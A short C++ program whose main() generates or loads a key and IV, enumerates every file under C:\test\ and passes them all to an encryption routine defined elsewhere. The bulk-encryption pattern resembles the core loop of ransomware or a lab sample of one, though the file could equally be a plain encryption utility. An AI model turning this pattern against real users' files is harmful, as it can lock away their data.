#include "function.cpp"

int main()
{
    uint8_t key[16];
    uint8_t iv[16];
    genKeyIfNeeded(key, iv);

    readFromFile(keyFilename, key, SIZE);
    readFromFile(ivFilename, iv, SIZE);

    std::string path = "C:\\test\\";
    std::vector<FileItem> items = listFilesAndDirectories(path);
    enc(items, "", path, key, iv);
    return 0;
}